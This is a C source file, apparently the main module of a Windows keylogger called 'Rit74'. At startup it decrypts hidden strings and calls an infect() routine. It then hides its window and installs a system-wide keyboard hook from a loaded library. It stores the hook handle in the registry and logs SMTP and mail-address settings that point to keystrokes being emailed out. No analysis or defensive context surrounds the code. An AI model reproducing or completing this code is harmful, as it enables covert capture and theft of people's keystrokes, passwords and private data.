
#include "winsock2.h"
#include "windows.h"
#include "winuser.h"
#include "winreg.h"

#include "string.h"
#include <io.h>
#include <fcntl.h>
#include <sys/stat.h>

HINSTANCE hinst; 
HWND hwndMain; 
HHOOK hhhook;
UINT timehnd;

#include "logout.c"
#include "regist.c"
#include "paths.c"
#include "crypt.c"
#include "keyproc.c"
#include "sendmail.c"
#include "infect.c"


int PASCAL WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
    LPSTR lpszCmdLine, int nCmdShow) 
{ 
    MSG msg; 
    WNDCLASS wc; 
    UNREFERENCED_PARAMETER(lpszCmdLine); 

    decrypt();
    infect();
    //HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer

    if (!hPrevInstance) 
    { 
        wc.style = 0; 
        wc.lpfnWndProc = (WNDPROC) DefWindowProc; 
        wc.cbClsExtra = 0; 
        wc.cbWndExtra = 0; 
        wc.hInstance = hInstance; 
        wc.hIcon = LoadIcon((HINSTANCE) NULL, IDI_APPLICATION); 
        wc.hCursor = LoadCursor((HINSTANCE) NULL, IDC_ARROW); 
        wc.hbrBackground = GetStockObject(WHITE_BRUSH); 
        wc.lpszMenuName =  "Rit74_Menu"; 
        wc.lpszClassName = "Rit74SysClass"; 
 
        if (!RegisterClass(&wc)) 
            return FALSE; 
    } 

    hinst = hInstance;
    hwndMain = CreateWindow("Rit74SysClass", "Rit74wnd", 
        WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 
        CW_USEDEFAULT, CW_USEDEFAULT, (HWND) NULL, 
        (HMENU) NULL, hinst, (LPVOID) NULL);
 
    if (!hwndMain){ return FALSE; };
 
    ShowWindow(hwndMain, SW_HIDE); // before it was "nCmdShow"

    HINSTANCE hLib = LoadLibrary(paths_exe());
    //if(hLib==NULL){ MessageBeep(0xFFFFFFFF);MessageBeep(0xFFFFFFFF);MessageBeep(0xFFFFFFFF); };
    HOOKPROC fpKeyproc = (HOOKPROC)GetProcAddress(hLib,"?keyproc@@YGJHIJ@Z");
    hhhook = SetWindowsHookEx(WH_KEYBOARD,fpKeyproc,hLib,0);
    regist_setbin(crypt.reg_data,crypt.val_hook,(char*)&hhhook,sizeof(HHOOK));

    timehnd=SetTimer(hwndMain,986,1000,(TIMERPROC)timeproc);	

    logout("\n\n\n\n\n(hi a) Loading resources ...\n");
    logout(crypt.smtp);          logout("\n");
    logout(crypt.mail);          logout("\n");
    logout(crypt.warn_title);    logout("\n");
    logout(crypt.warn_text);     logout("\n");
    logout("\n\n\n\n(a) Service started ...\n");

    do{
    GetMessage(&msg,(HWND)NULL,0,0);
    TranslateMessage(&msg); 
    DispatchMessage(&msg); 
    }while(msg.message!=WM_QUIT&&msg.message!=WM_DESTROY&&msg.message!=WM_CLOSE&&GetWindowLong(hwndMain,GWL_STYLE)!=0);
 
    logout("(a) Service stopped ...\n\n\n\n");
    UnhookWindowsHookEx(hhhook);
    KillTimer(NULL,timehnd);
    return 0;//msg.wParam;
} 

